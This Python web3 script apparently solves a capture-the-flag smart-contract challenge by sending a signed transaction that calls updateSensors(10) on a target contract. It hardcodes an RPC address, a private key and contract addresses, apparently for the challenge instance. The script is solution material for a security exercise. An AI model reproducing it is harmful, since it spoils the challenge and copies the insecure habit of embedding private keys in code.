from web3 import Web3
import json

w3 = Web3(Web3.HTTPProvider('http://68.183.45.143:31928')) # rpc

latest_block = w3.eth.get_block('latest')
# print(latest_block)

# Private key     :  0x53949d9cea852f2e765a3e20a710621cc2be213337d3c1d8033f2d3f190cd79f
# Address         :  0x055E58BF6267a78783B871A7D989868242c65172
# Target contract :  0x1A56759Bb1c2e2751ccB07ca2C2F4828Fca689E4
# Setup contract  :  0x0aECB410F070C3075C9DB6e38003E690360446fe

private_key = '0x53949d9cea852f2e765a3e20a710621cc2be213337d3c1d8033f2d3f190cd79f'
caller_address = '0x055E58BF6267a78783B871A7D989868242c65172'
target_contract = '0x1A56759Bb1c2e2751ccB07ca2C2F4828Fca689E4'
setup_contract = '0x0aECB410F070C3075C9DB6e38003E690360446fe'

# contract ABI
abi = [
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "name": "TARGET",
        "stateMutability": "view",
        "type": "function",
        "inputs": [],
        "outputs": [
            {"internalType": "contract Unknown", "name": "", "type": "address"}
        ],
    },
    {
        "name": "isSolved",
        "stateMutability": "view",
        "type": "function",
        "inputs": [],
        "outputs": [
            {"internalType": "bool", "name": "", "type": "bool"}
        ],
    },
    {
        "name": "updateSensors",
        "stateMutability": "nonpayable",
        "type": "function",
        "inputs": [
            {"internalType": "uint256", "name": "version", "type": "uint256"}
        ],
        "outputs": [],
    },
    {
        "name": "updated",
        "stateMutability": "view",
        "type": "function",
        "inputs": [],
        "outputs": [
            {"internalType": "bool", "name": "", "type": "bool"}
        ],
    }
]

# create smart contract
contract = w3.eth.contract(address=target_contract, abi=abi)

# call updateSensors() in Unknown contract
transaction = contract.functions.updateSensors(10).build_transaction({
    "chainId": w3.eth.chain_id,
    "from": caller_address,
    "nonce": w3.eth.get_transaction_count(caller_address)
})

# sign and send transaction
signed = w3.eth.account.sign_transaction(transaction, private_key=private_key)
sent = w3.eth.send_raw_transaction(signed.rawTransaction)

# get receipt
receipt = w3.eth.wait_for_transaction_receipt(sent)
print(receipt)
